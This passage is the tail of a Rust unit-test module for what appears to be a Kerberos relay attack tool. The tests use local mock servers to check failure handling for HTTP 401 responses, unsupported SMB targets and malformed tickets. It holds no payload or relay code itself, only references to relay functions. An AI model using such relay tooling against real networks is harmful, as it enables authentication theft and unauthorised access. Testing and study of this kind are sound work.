            other => panic!("expected ContinuationNeeded, got {:?}", other.summary()),
        }
        server.await.unwrap();
    }

    #[tokio::test]
    async fn test_relay_kerberos_http_401_without_token_fails() {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();

        let server = tokio::spawn(async move {
            let (mut sock, _) = listener.accept().await.unwrap();
            let mut buf = vec![0u8; 4096];
            sock.read(&mut buf).await.unwrap();
            sock.write_all(
                b"HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: Basic\r\nContent-Length: 0\r\n\r\n",
            )
            .await
            .unwrap();
        });

        let outcome = relay_kerberos_to_http(
            addr,
            false,
            "/",
            &bare_apreq_fixture(),
            Duration::from_secs(5),
        )
        .await
        .expect("no transport error");
        match outcome {
            KrbRelayOutcome::Failed { reason, .. } => {
                assert!(reason.contains("401"), "401 reason present: {reason}");
            }
            other => panic!("expected Failed, got {:?}", other.summary()),
        }
        server.await.unwrap();
    }

    // -------------------------------------------------------
    // Dispatcher
    // -------------------------------------------------------

    #[tokio::test]
    async fn test_relay_kerberos_unsupported_protocol() {
        let target = RelayTarget {
            address: "127.0.0.1:445".parse().unwrap(),
            protocol: Protocol::Smb,
            username: None,
        };
        let outcome = relay_kerberos(&target, &bare_apreq_fixture(), Duration::from_secs(1)).await;
        match outcome {
            KrbRelayOutcome::Failed { reason, .. } => {
                assert!(
                    reason.contains("not implemented") && reason.contains("ldap"),
                    "lists supported protocols: {reason}"
                );
            }
            other => panic!("expected Failed, got {:?}", other.summary()),
        }
    }

    #[tokio::test]
    async fn test_relay_kerberos_garbage_blob_fails() {
        let target = RelayTarget {
            address: "127.0.0.1:389".parse().unwrap(),
            protocol: Protocol::Ldap,
            username: None,
        };
        let outcome =
            relay_kerberos(&target, b"plainly not kerberos", Duration::from_secs(1)).await;
        match outcome {
            KrbRelayOutcome::Failed { reason, .. } => {
                assert!(reason.contains("AP-REQ"), "guidance present: {reason}");
            }
            other => panic!("expected Failed, got {:?}", other.summary()),
        }
    }

    #[test]
    fn test_outcome_summary_shapes() {
        let target = RelayTarget {
            address: "127.0.0.1:389".parse().unwrap(),
            protocol: Protocol::Ldap,
            username: None,
        };
        let ok = KrbRelayOutcome::Completed {
            target: target.clone(),
            detail: "bind ok".into(),
        };
        assert!(ok.is_success());
        assert!(ok.summary().contains("bind ok"));
        let bad = KrbRelayOutcome::Failed {
            target: target.clone(),
            reason: "no".into(),
        };
        assert!(!bad.is_success());
        assert!(bad.summary().contains("FAILED"));
    }
}
